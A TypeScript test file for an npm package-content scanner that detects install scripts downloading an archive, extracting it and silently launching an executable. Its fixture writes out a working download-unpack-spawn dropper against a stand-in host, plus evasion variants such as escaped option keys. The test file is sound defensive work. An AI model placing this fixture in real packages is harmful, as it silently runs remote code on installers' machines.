import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { scanDownloadExecution } from '../src/scanner/content-download-exec.js';
import { analyzePackageTarball } from '../src/scanner/package-content.js';
import { makeTarball } from './helpers/package-tarball.js';

const helpers = `
const fs = require('node:fs');
const path = require('node:path');
const https = require('node:https');
const { spawn } = require('node:child_process');
const seven = require('node-7z');
function receive(url, destination) {
  const output = fs.createWriteStream(destination);
  https.get(url, response => { response.pipe(output); });
}
function unpack(archive, directory) { seven.extractFull(archive, directory, { password: 'fixture' }); }
function launch(directory) {
  const files = fs.readdirSync(directory);
  const entry = files.find(file => file.endsWith('.exe'));
  const executable = path.join(directory, entry);
  spawn(executable, [], { detached: true, stdio: 'ignore' });
}
`;
const sequence = `
async function main() {
  const url = 'https://example.invalid/fixture.zip';
  const archive = path.join(process.env.TEMP, 'fixture.zip');
  const directory = path.join(process.env.TEMP, 'fixture');
  await receive(url, archive);
  await unpack(archive, directory);
  await launch(directory);
}
main();
`;
const scan = (source: string) => scanDownloadExecution(source, 'package/install.js');

describe('connected download and silent execution', () => {
  it('retains supported escaped option keys through the archive prefilter', () => {
    const source = (helpers + sequence).replace('detached:', String.raw`'det\x61ched':`);
    const result = analyzePackageTarball(makeTarball([{ path: 'package/install.js', content: source }]));
    assert.equal(result.summary.status, 'complete');
    assert.ok(result.findings.some(finding => finding.ruleId === 'content-download-exec'));
  });

  it('recognizes parameter-linked HTTP download, extraction and silent launch helpers', () => {
    const result = scan(helpers + sequence);
    assert.equal(result.length, 1);
    assert.equal(result[0].severity, 'high');
    assert.equal(result[0].ruleId, 'content-download-exec');
    assert.match(result[0].message, /after archive extraction/);
    assert.equal(result[0].codeSnippet, 'launch(directory)');
  });

  it('recognizes equivalent CommonJS and function callback forms', () => {
    const source = (helpers + sequence).replaceAll('node:', '').replace('response => { response.pipe(output); }', 'function(response) { response.pipe(output); }');
    assert.equal(scan(source).length, 1);
  });

  it('recognizes an alias of the destination without matching variable names', () => {
    assert.equal(scan(helpers + sequence.replace('await unpack(archive, directory);', 'const copy = archive; await unpack(copy, directory);')).length, 1);
  });

  it('recognizes a downloaded file passed directly to a bound silent spawn', () => {
    assert.equal(scan(helpers + `const destination = 'tool.exe'; receive('https://example.invalid/tool', destination); spawn(destination, [], { detached: true, stdio: 'ignore' });`).length, 1);
  });

  for (const [name, source] of [
    ['unrelated networking and local command', helpers + `receive('https://example.invalid/data', 'data.zip'); spawn('local-tool', [], { detached: true, stdio: 'ignore' });`],
    ['download without execution', helpers + sequence.replace('await launch(directory);', '')],
    ['execution without download', helpers + sequence.replace('await receive(url, archive);', '')],
    ['ordinary build subprocess', (helpers + sequence).replace('detached: true', 'detached: false')],
    ['visible subprocess', (helpers + sequence).replace("stdio: 'ignore'", "stdio: 'inherit'")],
    ['different unpack input', helpers + sequence.replace('unpack(archive, directory)', "unpack('local.zip', directory)")],
    ['different execution directory', helpers + sequence.replace('launch(directory)', "launch('local-bin')")],
    ['reassigned archive path', helpers + sequence.replace('await unpack(archive, directory);', "archive = 'local.zip'; await unpack(archive, directory);")],
    ['reassigned module', helpers + "https = fixture;" + sequence],
    ['shadowed module parameter', helpers.replace('function receive(url, destination)', 'function receive(url, destination, https)') + sequence],
    ['shadowed module in an arrow callback', helpers.replace('https.get(url,', '((https) => https.get(url,').replace('response.pipe(output); });', 'response.pipe(output); }))(fixture);') + sequence],
    ['reassigned helper', helpers + 'receive = localCopy;' + sequence],
    ['wrong HTTP response receiver', helpers.replace('response.pipe(output)', 'other.pipe(output)') + sequence],
    ['unconnected write stream', helpers.replace('fs.createWriteStream(destination)', "fs.createWriteStream('log.txt')") + sequence],
    ['stream reassigned in callback', helpers.replace('response.pipe(output)', "output = fs.createWriteStream('log.txt'); response.pipe(output)") + sequence],
    ['unused nested response function', helpers.replace('response.pipe(output);', 'function ignored(response) { response.pipe(output); }') + sequence],
    ['unused nested downloader', helpers.replace('const output = fs.createWriteStream(destination);', 'function unused() { const output = fs.createWriteStream(destination);').replace('response.pipe(output); });', 'response.pipe(output); }); }') + sequence],
    ['overridden detached option', (helpers + sequence).replace('detached: true', 'detached: true, detached: false')],
    ['spread-overridden launch options', (helpers + sequence).replace("stdio: 'ignore'", "stdio: 'ignore', ...options")],
    ['shadowed block paths', helpers + `receive('https://example.invalid/tool','tool'); const target='local'; {const target='tool';} spawn(target,[],{detached:true,stdio:'ignore'});`],
    ['object method process parameter', helpers + `const fixture={run(spawn){receive('https://example.invalid/tool','tool');spawn('tool',[],{detached:true,stdio:'ignore'});}};`],
    ['escaping relative executable path', helpers.replace('path.join(directory, entry)', "path.join(directory, '..', 'local.exe')") + sequence],
    ['quoted sample', `const docs = ${JSON.stringify(helpers + sequence)};`],
    ['commented sample', `/* ${helpers + sequence} */`],
  ]) {
    it(`does not join ${name} into a downloaded execution signal`, () => assert.deepEqual(scan(source), []));
  }
});
